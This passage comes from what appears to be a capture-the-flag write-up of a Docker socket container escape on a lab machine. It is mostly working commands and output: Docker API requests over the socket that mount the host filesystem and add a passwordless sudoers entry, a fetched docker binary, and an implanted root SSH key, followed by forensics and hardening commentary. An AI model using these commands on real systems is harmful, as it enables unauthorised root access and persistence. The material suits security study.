      "Type": "bind",
      "Source": "/",
      "Target": "/rootfs"
    }
  ]
}

```

I’ll connect to the container using `socat` (I had to upload a copy downloaded from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)), and enter an HTTP PORT request:

```

root@2d24bf61767c:~# ./socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/22c0/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host: 
Connection: Upgrade
Upgrade: tcp

```

The response back shows `UPGRADED`:

```

root@2d24bf61767c:~# ./socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/22c0/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host: 
Connection: Upgrade
Upgrade: tcp
                              
HTTP/1.1 101 UPGRADED   
Content-Type: application/vnd.docker.raw-stream
Connection: Upgrade
Upgrade: tcp                                                                                                              

```

At this point the terminal is just hanging, but if I give it a command, it runs and returns results:

```

id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27
(video)

```

I can easily read `root.txt`, or use the techniques that follow to get a full shell.

### Shell

There’s a ton of ways to get a shell with root file system access. I’ll add myself to the `/etc/sudoers` file. It by default looks like:

```

root@2d24bf61767c:~# id=$(curl --unix-socket /var/run/docker.sock -s -X 'POST' -H 'Content-Type: application/json' --data-binary '{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "cat /rootfs/etc/sudoers"], "Tty": true}' http://localhost/containers/create | cut -d'"' -f4); curl --unix-socket /var/run/docker.sock -s -X POST -H "Content-Type: application/json" http://localhost/containers/${id}/start; curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/${id}/logs?stderr=1&stdout=1"
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

```

I’ll add a line to the end with the command:

```

echo "tomcat ALL=(ALL) NOPASSWD:ALL" >> /rootfs/etc/sudoers

```

In the one-liner:

```

root@2d24bf61767c:~# id=$(curl --unix-socket /var/run/docker.sock -s -X 'POST' -H 'Content-Type: application/json' --data-binary '{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "echo \"tomcat ALL=(ALL) NOPASSWD:ALL\" >> /rootfs/etc/sudoers"], "Tty": true}' http://localhost/containers/create | cut -d'"' -f4); curl --unix-socket /var/run/docker.sock -s -X POST -H "Content-Type: application/json" http://localhost
/containers/${id}/start; curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/${id}/logs?stderr=1&stdout=1"

```

Once I run that, back at a tomcat shell, I can `sudo su`:

```

tomcat@VirusBucket:/dev/shm$ sudo su
root@VirusBucket:/dev/shm#

```

## Beyond Root

### docker Binary

After solving, I later learned I could have just skipped the API all together and used the `docker` binary. It’s not in the container, but there is a copy [here](https://master.dockerproject.org/linux/x86_64/docker). I’ll download it to my box, and then use a Python webserver to upload it to the container.

```

root@2d24bf61767c:~# wget 10.10.14.15/docker
--2020-09-03 02:01:06--  http://10.10.14.15/docker
Connecting to 10.10.14.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 53959101 (51M) [application/octet-stream]
Saving to: ‘docker’

docker              100%[===================>]  51.46M  10.4MB/s    in 5.0s    

2020-09-03 02:01:11 (10.3 MB/s) - ‘docker’ saved [53959101/53959101]

root@2d24bf61767c:~# chmod +x docker

```

Now I can run a container the same way I have in other Docker privescs:

```

root@2d24bf61767c:~# ./docker run -v /:/rootfs --rm -it sandbox sh
/ #

```

The arguments are:
- `-v /:rootfs` - map the hosts `/` to `/rootfs` in the container as a volume
- `--rm` - remove the container when it exits
- `-i` - interactive
- `-t` - allocate a pseudo-TTY
- `sandbox` - the name of the image to start
- `sh` - the command to run in the container

Once inside, I can find the file system just as before:

```

/ # cd rootfs/
/rootfs # ls
bin         home        lost+found  root        swap.img
boot        lib         media       run         sys
cdrom       lib32       mnt         sbin        tmp
dev         lib64       opt         snap        usr
etc         libx32      proc        srv         var
/rootfs # cd root/
/rootfs/root # ls
root.txt  snap

```

### Forensics

How is the container able to execute commands on the host? I was interactiving with `/var/run/docker.sock` in the container. With a root shell on Feline, I’ll investigate. I dropped a SSH key into `/root/.ssh/authorized_keys` and connected to Feline as root.

To see running containers, I’ll run `docker ps`:

```

root@VirusBucket:~# docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                  NAMES
2d24bf61767c        188a2704d8b0        "/usr/bin/dumb-init …"   2 months ago        Up 10 hours         127.0.0.1:4505-4506->4505-4506/tcp, 22/tcp, 127.0.0.1:8000->8000/tcp   saltstack

```

`docker inspect [container id]` will dump a *ton* of config information about the container. I’ll dump it to a file, and on searching for `docker.sock`, find this section:

```

"HostConfig": {
    "Binds": [
        "/var/run/docker.sock:/var/run/docker.sock"
    ],
    "ContainerIDFile": "",
    "LogConfig": {               
        "Type": "json-file",
        "Config": {}
    },                              
    "NetworkMode": "default",         
    "PortBindings": {
        "4505/tcp": [
            {
                "HostIp": "127.0.0.1",
                "HostPort": "4505"
            }
        ],
        "4506/tcp": [
            {
                "HostIp": "127.0.0.1",
                "HostPort": "4506"
            }
        ],
        "8000/tcp": [        
            {
                "HostIp": "127.0.0.1",
                "HostPort": "8000"            
            }
        ]
    },
    "RestartPolicy": {
        "Name": "always",
        "MaximumRetryCount": 0
    },

```

This looks familiar, as it’s the same section of options I provided the API when escalating. The various SaltStack ports are mapped through to the host. But so is `/var/run/docker.sock`, which is mapped to a file of the same name inside the container.

[This Medium post](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd) talks about `/var/run/docker.sock` and why you might map this file into a Docker container. If you want something from within the container to be able to control other containers, you have to give it some method to talk to the host system. This UNIX socket is how Docker takes commands and returns results.

Looking at the file on Feline, I can see it’s owned by root and the docker group. This is standard, and what allows only root and docker users to start containers.

```

root@VirusBucket:~# ls -la /var/run/docker.sock 
srw-rw---- 1 root docker 0 Sep  3 01:56 /var/run/docker.sock

```

Many articles about mapping `/var/run/docker.sock` into a container will say things like:

> This should only be done for trusted containers.

That seems like a bit of an under-selling the risk to me. At the risk of jumping on a soapbox, if we’re learning anything following the news, there’s no such thing as a trusted computer. Defense in depth is built on making the attack go through many walls to get to the thing they want. And this just puts a door in one of them. Basically, if you can get access to that socket from within the container, you are as good as root on the host.